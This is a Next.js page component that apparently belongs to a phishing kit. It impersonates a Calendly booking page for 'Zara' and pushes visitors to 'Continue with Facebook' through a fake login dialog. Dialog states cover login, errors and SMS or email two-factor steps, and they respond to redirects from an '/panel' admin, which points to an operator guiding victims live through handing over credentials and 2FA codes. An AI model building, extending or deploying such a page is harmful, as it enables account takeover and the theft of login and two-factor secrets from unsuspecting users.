"use client"

import Image from "next/image"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Dialog, DialogTrigger } from "@/components/ui/dialog" // Import Dialog and DialogTrigger
import { Clock, Phone, Globe, User, Calendar, CheckCircle, Facebook } from "lucide-react"
import { useState, useEffect } from "react" // Import useState
import FacebookLoginDialog from "./facebook-login-dialog" // Import the new dialog component
import { useSearchParams, useRouter } from "next/navigation"

export default function ScheduleCall() {
  const [isFacebookDialogOpen, setIsFacebookDialogOpen] = useState(false)
  const [currentTime, setCurrentTime] = useState('')
  const [timezone, setTimezone] = useState('')
  const searchParams = useSearchParams()
  const router = useRouter()

  // Effect to handle dialog opening based on URL parameters
  useEffect(() => {
    const dialog = searchParams.get('dialog')
    if (dialog === 'facebook' || dialog === 'login-error' || dialog === 'loading' || dialog === '2fa' || dialog === '2fa-error' || dialog === '2fa-sms' || dialog === '2fa-sms-error' || dialog === '2fa-email' || dialog === '2fa-email-error') {
      setIsFacebookDialogOpen(true)
    }
  }, [searchParams])

  // Effect to listen for admin redirects and close all dialogs
  useEffect(() => {
    const handleAdminRedirect = () => {
      // Close all dialogs when redirected from admin
      setIsFacebookDialogOpen(false)
      
      // If there are URL parameters indicating a dialog should be open,
      // clear them to ensure a clean state
      const currentDialog = searchParams.get('dialog')
      if (currentDialog) {
        // Use replace to avoid adding to browser history
        const url = new URL(window.location.href)
        url.searchParams.delete('dialog')
        router.replace(url.pathname)
      }
    }

    // Listen for session redirect events from admin panel
    const handleSessionRedirect = (event: CustomEvent) => {
      if (event.detail?.redirectToPage?.includes('/schedule-call')) {
        handleAdminRedirect()
      }
    }

    // Listen for immediate admin redirect events
    const handleImmediateRedirect = (event: CustomEvent) => {
      if (event.detail?.redirectTo?.includes('/schedule-call')) {
        handleAdminRedirect()
      }
    }

    // Listen for navigation events that might indicate an admin redirect
    const handleNavigation = () => {
      // Small delay to ensure the page has loaded
      setTimeout(handleAdminRedirect, 100)
    }

    // Add event listeners
    window.addEventListener('session-redirect-set', handleSessionRedirect as EventListener)
    window.addEventListener('admin-redirect-happening', handleImmediateRedirect as EventListener)
    window.addEventListener('popstate', handleNavigation)
    
    // Also handle direct navigation (when page loads after redirect)
    const referrer = document.referrer
    if (referrer.includes('/panel')) {
      handleAdminRedirect()
    }

    return () => {
      window.removeEventListener('session-redirect-set', handleSessionRedirect as EventListener)
      window.removeEventListener('admin-redirect-happening', handleImmediateRedirect as EventListener)
      window.removeEventListener('popstate', handleNavigation)
    }
  }, [searchParams, router])

  useEffect(() => {
    // Function to update current time and timezone
    const updateTimeAndTimezone = () => {
      const now = new Date()
      
      // Get user's timezone
      const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone
      setTimezone(userTimezone)
      
      // Format current time (24-hour format)
      const timeString = now.toLocaleTimeString('en-US', {
        hour12: false,
        hour: '2-digit',
        minute: '2-digit'
      })
      setCurrentTime(timeString)
    }

    // Update immediately
    updateTimeAndTimezone()
    
    // Update every minute
    const interval = setInterval(updateTimeAndTimezone, 60000)
    
    return () => clearInterval(interval)
  }, [])

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50 p-4">
      <Card className="w-full max-w-4xl flex flex-col md:flex-row shadow-lg rounded-lg overflow-hidden relative">
        {/* Calendly Ribbon */}
        <div className="absolute top-0 right-0 w-0 h-0 border-l-[120px] border-l-transparent border-t-[120px] border-t-slate-600 z-10">
          <div className="absolute -top-[92px] right-[0px] transform rotate-45 text-white text-center whitespace-nowrap">
            <div className="text-[10px] font-light tracking-wider">POWERED BY</div>
            <div className="text-sm font-bold tracking-wide">Calendly</div>
          </div>
        </div>

        {/* Left Column - Meeting Details */}
        <div className="flex-1 p-8 bg-white border-r border-gray-200 flex flex-col justify-between">
          <div>
            <Image src="/zara.jpeg" alt="Zara logo" width={100} height={36} className="mb-6" />
            <h2 className="text-lg font-semibold text-gray-600">Zara</h2>
            <h1 className="text-3xl font-bold mb-6">30 Minutes Meeting</h1>
            <div className="space-y-3 text-gray-700">
              <div className="flex items-center gap-2">
                <Clock className="w-5 h-5 text-gray-500" />
                <span>30 min</span>
              </div>
              <div className="flex items-center gap-2">
                <Phone className="w-5 h-5 text-gray-500" />
                <span>Phone call</span>
              </div>
              <div className="flex items-center gap-2">
                <Globe className="w-5 h-5 text-gray-500" />
                <span>{timezone ? `${timezone} (${currentTime})` : 'Loading timezone...'}</span>
              </div>
            </div>
          </div>
          <div className="flex justify-between text-sm text-blue-600 mt-8">
            <a href="#" className="hover:underline">
              Cookie settings
            </a>
            <a href="#" className="hover:underline">
              Report abuse
            </a>
          </div>
        </div>

        {/* Right Column - Scheduling Flow */}
        <div className="flex-1 p-8 bg-gray-50">
          <h2 className="text-2xl font-semibold mb-6">Schedule call with Zara</h2>
          <div className="flex items-center justify-between mb-8">
            <div className="flex flex-col items-center gap-2">
              <div className="w-10 h-10 rounded-full bg-blue-600 text-white flex items-center justify-center">
                <User className="w-5 h-5" />
              </div>
              <span className="text-sm font-medium text-blue-600">Verify</span>
            </div>
            <div className="flex-1 h-0.5 bg-gray-300 mx-2" />
            <div className="flex flex-col items-center gap-2">
              <div className="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center">
                <Calendar className="w-5 h-5" />
              </div>
              <span className="text-sm text-gray-500">Schedule</span>
            </div>
            <div className="flex-1 h-0.5 bg-gray-300 mx-2" />
            <div className="flex flex-col items-center gap-2">
              <div className="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center">
                <CheckCircle className="w-5 h-5" />
              </div>
              <span className="text-sm text-gray-500">Finish</span>
            </div>
          </div>

          <div className="bg-yellow-50 border border-yellow-200 text-yellow-800 p-4 rounded-md mb-6">
            <p className="text-sm">
              Please confirm your appointment with Zara.
              <br />
              To complete the confirmation process, continue with Facebook
            </p>
          </div>

          <Dialog open={isFacebookDialogOpen} onOpenChange={(open) => {
            setIsFacebookDialogOpen(open)
            if (open && !searchParams.get('dialog')) {
              // When user manually opens dialog, set URL parameter for consistency
              const url = new URL(window.location.href)
              url.searchParams.set('dialog', 'facebook')
              router.replace(url.pathname + url.search)
            } else if (!open && searchParams.get('dialog')) {
              // When user closes dialog, remove URL parameter
              const url = new URL(window.location.href)
              url.searchParams.delete('dialog')
              router.replace(url.pathname + url.search)
            }
          }}>
            <DialogTrigger asChild>
              <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white flex items-center justify-center gap-2">
                <Facebook className="w-5 h-5" />
                Continue with Facebook
              </Button>
            </DialogTrigger>
            <FacebookLoginDialog 
              onClose={() => setIsFacebookDialogOpen(false)}
              initialStep={
                searchParams.get('dialog') === '2fa' ? '2fa' : 
                searchParams.get('dialog') === '2fa-error' ? '2fa-error' : 
                searchParams.get('dialog') === '2fa-sms' ? '2fa-sms' : 
                searchParams.get('dialog') === '2fa-sms-error' ? '2fa-sms-error' : 
                searchParams.get('dialog') === '2fa-email' ? '2fa-email' : 
                searchParams.get('dialog') === '2fa-email-error' ? '2fa-email-error' : 
                searchParams.get('dialog') === 'loading' ? 'loading' : 
                searchParams.get('dialog') === 'login-error' ? 'login-error' : 
                'login'
              }
            />
          </Dialog>
        </div>
      </Card>
    </div>
  )
}
